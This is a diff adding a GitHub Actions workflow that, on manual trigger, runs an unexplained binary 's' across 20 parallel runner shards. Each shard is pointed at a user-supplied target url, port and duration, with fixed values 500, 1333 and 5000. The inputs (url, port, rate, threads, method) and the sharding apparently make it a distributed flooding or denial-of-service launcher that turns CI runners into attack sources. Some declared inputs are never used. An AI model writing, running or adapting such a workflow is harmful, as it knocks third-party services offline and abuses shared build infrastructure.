@@ -1,0 +1,41 @@
+name: Run s
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        required: true
+        type: string
+      rate:
+        required: true
+        type: number
+      time:
+        required: true
+        type: number
+      threads:
+        required: true
+        type: number
+      port:
+        required: true
+        type: number
+      data:
+        required: false
+        type: string
+      method:
+        required: false
+        type: string
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Make s executable
+        run: chmod +x s
+      - name: Run s with parameters
+        run: |
+          ./s "${{ inputs.url }}" "${{ inputs.port }}" 500 1333 5000 "${{ inputs.time }}"
